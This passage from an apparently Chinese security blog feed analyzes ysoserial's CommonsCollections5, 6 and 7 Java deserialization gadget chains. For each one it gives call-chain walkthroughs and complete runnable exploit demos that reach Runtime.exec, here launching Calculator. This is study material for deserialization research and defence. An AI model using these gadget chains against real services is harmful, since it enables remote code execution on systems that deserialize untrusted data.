templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">         field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">         Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">         field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;,new Object[]&#123;templates&#125;)</span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">         TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(chainedTransformer);</span><br><span class="line">         PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line">         </span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(priorityQueue);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="1.png" alt=""></p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections5</title>
    <url>/2020/04/26/ysoserial-analyze-5/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections5，把它与CommonsCollections1进行对比的话，最外层的类由<code>AnnotationInvocationHandler</code>变成了<font color=#008000><code>BadAttributeValueExpException</code></font>。最终的目标都是要触发<code>LazyMap.get</code>函数。</p>
<a id="more"></a>

<p>前面已经分析过<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a></p>
<p>使用此payload进行利用时，需要未配置security-manager。来看看整个的利用链:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;LazyMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>为了要触发LazyMap.get函数，就必须找一个类，该类满足2个条件:1)类可序列化，类属性又个可控的Map或Object；2)该类的类函数上调用了Map.get。CommonsCollections5在这里用到了<code>TiedMapEntry</code>类</p>
<p><img src="2.png" alt=""></p>
<p>该类有Map成员变量，且在getValue方法中调用了Map.get。现在的问题就变成了如何调用getValue方法。可以知道的是该类的toString、hashCode、equals均调用到了getValue函数。在这个利用链中利用的是toString函数。这里介绍一个类<code>BadAttributeValueException</code>。在它的readObject方法中调用了toString()函数。</p>
<p><img src="1.png" alt=""></p>
<p>首先定位到BadAttributeValueException类的readObject方法。可以看到当System.getSecurityManager为null或者当valObj是这7种类型之一的时，会调用<code>toString()</code>函数。很显然valObj的类型是TiedMapEntry，所以需要未对security-manager进行配置。  </p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>那么现在很自然地可以想到，实例化一个TiedMapEntry类，类属性为构造好的LazyMap。那么代码如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么如何获取到valObj呢？查看BadAttributeValueException类readObject函数中，可以看到valObj是获取了BadAttributeValueException属性中的”val”属性。因此，需要将TiedMapEntry类作为BadAttributeValueException实例中的的val属性。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valField = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">valField.set(val,tiedMapEntry);</span><br></pre></td></tr></table></figure>

<p>整个demo如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valField = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(val,tiedMapEntry);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下图所示:<br><img src="3.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.cnblogs.com/tr1ple/p/12411357.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(5)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections6</title>
    <url>/2020/04/27/ysoserial-analyze-6/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections6。CommonsCollections6主要是利用<font color=#008000><code>Hashset</code></font>触发readObject函数，然后利用LazyMap.get函数触发transform函数。</p>
<a id="more"></a>

<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a>  </p>
<p>CommonsCollections6与CommonsCollections5相比，最外层使用的是新的类<code>HashSet</code>，即从HashSet触发其readObject()一直到触发TiedMapEntry.getValue()。整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  -&gt;HashMap.put()</span><br><span class="line">    -&gt;HashMap.hash()</span><br><span class="line">      -&gt;TiedMapEntry.hashCode()</span><br><span class="line">        -&gt;TiedMapEntry.getValue()</span><br><span class="line">          -&gt;LazyMap.get()</span><br><span class="line">            -&gt;ChainedTransformer.transform()</span><br><span class="line">              -&gt;ConstantTransformer.transform()</span><br><span class="line">              -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>从整个利用链可以得知，从TiedMapEntry.getValue开始到结束与前面的CommonsCollections5一样，在这里就不再分析它了。</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>在前面提到过TiedMapEntry类触发其getValue函数有toString、hashCode以及equals。CommonsCollections5利用的就是toString，而此次我们要分析的是<code>hashCode</code>。</p>
<p>那么首先，我们需要找到一个类，1)可序列化;2)它的方法中调用了Object.hashCode或者调用了TiedMapEntry.hashCode或者是Entry.hashCode。</p>
<p>由于hashCode的存在主要是用于查找的快捷性，容易出现在HashTable、HashMap等。在这里定位到HashMap类中，发现其有一个hash()方法。发现其调用了key.hashCode，且key是一个Object类。</p>
<p><img src="1.png" alt=""></p>
<p>那么接下来就需要找调用这个hash函数的地方，通过搜索调用hash函数的有putMapEntries、get、containsKey、put、remove等。CommonsCollections6选择了put函数。</p>
<p><img src="2.png" alt=""></p>
<p>其实类中的add方法页调用了map.put方法。那么接下来就转变为寻找一个类，满足1）可序列化；2）方法中调用了HashMap的put方法、Object的put方法或Map的put方法。</p>
<p>这里我们定位到HashSet的readObject方法。</p>
<p><img src="3.png" alt=""></p>
<p>可以看到在其readObject函数中，创建了一个Map，且在后续调用了map.put。到此为止整个利用链就分析完了。接下来构造payload。</p>
<h2 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h2><p>分析payload的构造，也从TiedMapEntry.hashCode开始分析。在这里和之前一样，只需要保持TiedMapEntry的this.map是LazyMap对象即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">               new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">               new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">       Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">       Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">       TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后就是调用TiedMapEntry.hashCode的HashMap.hash方法。<code>hash(Object key)</code>调用了key.hashCode()。所以传入的参数key需要为上面构造好的TiedMapEntry对象。继续追溯这个key的来源。put方法中接收key这个参数来调用hash(key)。继续往上，就是hashSet中的<code>map.put(e,PRESENT)</code>。因此，e必须为TiedMapEntry对象。因此e是一个序列化后的TiedMapEntry对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br></pre></td></tr></table></figure>

<p><img src="4.png" alt=""></p>
<p>实例化后的HashSet会将map属性实例化为一个空的HashMap对象。HashSet的add方法能够往这个map属性中加入元素。add方法本质上也是调用map.put(e,PRESENT)。<code>add(&quot;foo&quot;)</code>的作用就是map.put(“Foo”,PRESENT)。</p>
<p><img src="5.png" alt=""></p>
<p>再调用<code>map.add(&quot;foo&quot;)</code>之后，整个过程是HashMap的存储过程。实际上就是HashMap新建了一个Node节点，节点的key为”foo”。因此，我们要做的就是获取到这个建立的节点，将其key更改为TiedMapEntry对象。</p>
<p>首先获取HashSet的map属性,其属性是个HashMap。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Field d =<span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span>(NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分析HashMap的存储过程可以知道，Node节点是存储在HashMAp的table属性中的。接着获取HashMap中的table属性，然后通过反射拿到节点数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>拿到节点数组之后就是获取节点的key属性，将其赋值为TeidMapEntry对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(node,tiedMapEntry);</span><br></pre></td></tr></table></figure>


<p>整个payload的构造就到这里结束了。完整的demo如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map beforemap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(beforemap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span>(NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//返回map对象上此Field表示的字段的值</span></span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(map);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下所示:</p>
<p><img src="6.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/12421157.html" target="_blank" rel="noopener">Java反序列化-ysoserial-调试分析总结篇(6)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections7</title>
    <url>/2020/04/27/ysoserial-analyze-7/</url>
    <content><![CDATA[<p>这篇文章分析的CommonsCollections7。这篇文章主要介绍了利用<font color=#008000>Hash碰撞</font>的方式来触发LazyMap.get函数，从而调用到transform函数，执行任意命令。</p>
<a id="more"></a>

<p>前面已经分析过:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a>  </p>
<p>CommonsCollections7与前面的CommonsCollections5，6的不同点挺多的。它使用了<code>hash碰撞</code>的方式来触发LazyMap.get函数。而在最外层使用的是<code>Hashtable</code>来触发其readObject函数。它整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashTable.readObject()</span><br><span class="line">  -&gt;HashTable.reconstitutionPut()</span><br><span class="line">  	-&gt;AbstractMapDecorator.equals()</span><br><span class="line">  	  -&gt;AbstractMap.equals()</span><br><span class="line">  	    -&gt;LazyMap.get()</span><br><span class="line">  	      -&gt;ChainedTransformer.transform()</span><br><span class="line">  	        -&gt;ConstantTransformer.transform()</span><br><span class="line">  	        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>由于从LazyMap.get到最后的整个过程之前都已经分析过。这里我们就分析LazyMap.get往前的利用链。</p>
<p>考虑到需要触发LazyMap.get函数，根据以往的想法，需要找到一个具有这样条件的类：1）该类可以被反序列化。2）该类调用了LazyMap.get()或者Map.get()或者Object。get()。但是这条利用链比较特殊，它用到了hash碰撞。我们从头开始分析，首先定位到HashTable的readObject函数。</p>
<p><img src="1.png" alt=""></p>
<p>可以看到在最后有一个<code>reconstitutionPut</code>函数。跟进这个函数</p>
<p><img src="2.png" alt=""></p>
<p>该函数收看会填充table的内容，然后在if判断中，首先<code>e.hash==hash</code>为真，才会进入<code>e.key.equals(key)</code>的判断。跟进equals，这里的equals函数取决于key的类型，在利用链中利用的是LazyMap对象，它调用的其父类AbstractMapDecorator的equals函数。</p>
<p><img src="3.png" alt=""></p>
<p>在这个equals函数中，又调用了map的equals函数，这里实际调用的是HashMap的父类<code>AbstractMap</code>的equals函数。跟进这个equals函数，可以发现在里面调用了<code>m.get(key)</code>。此时只需要让m为LazyMap对象即可。</p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>从Hashtables.readObject函数中进入reconstitutionPut，这个函数中会在<code>tab</code>中存入<code>&lt;key,value&gt;</code>的entry，它会通过hash计算当前存放的entry在tab中的位置，若key的hash值一样，那么位置就一样，就会进入if判断。这时候会先比较下一个entry与当前key的hash值是否一样，若一致，则进入<code>e.key.equals(key)</code>。</p>
<p>那么首先就需要解决如何进入<code>e.key.equals(key)</code>。在Hashtable中放入2个entry，其key是一致的。进而进入<code>e.key.equals(key)</code>。这里选择放置两个LazyMap对象作为key。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">Map lazymap1 = LazyMap.decorate(innerMap1,chainedTransformer);</span><br><span class="line">lazymap1.put(<span class="string">"yy"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazymap2 = LazyMap.decorate(innerMap2,chainedTransformer);</span><br><span class="line">lazymap2.put(<span class="string">"zz"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazymap1,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazymap2,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>进入equals函数，进一步分析为什么放入的是这样的key。此时的key作为参数传入了equals函数。由于<code>e.key</code>是一个lazyMap，应该调用的是LazyMap的equals函数，而LazyMap继承了AbstractMapDecorator类且并未重写equals函数，因此调用的是<code>AbstractMapDecorator</code>类的equals函数。</p>
<p>但是从AbstractMapDecorator类的equals函数接着就调用到了AbstractMap类的equals函数不是很能理解，猜测可能是因为AbstractMapDecorator是AbstractMap类的一个装饰类，因此调用的是AbstractMap类的equals方法。它会首先判断传入的key是否是AbstractMapDecorator实例，不是则调用AbstractMap类的equals方法。  </p>
<p>进入AbstractMap的equals方法。同样传入的参数是一开始的key，这个key会转化为一个Map类型对象m。这个m在接下来调用了<code>m.get(key)</code>。在利用链中可以知道，这个m必须为LazyMap对象，即前面的Hashtable的entry中的key是LazyMap对象。</p>
<p><img src="5.png" alt=""></p>
<p>在这里需要满足两个Lazymap对象的size是一致的，且这里需要满足value不为null，才能调用到<code>m.get(key)</code>。看起来似乎就是满足的。事实上，查看ysoserial的payload，可以发现有如下操作。</p>
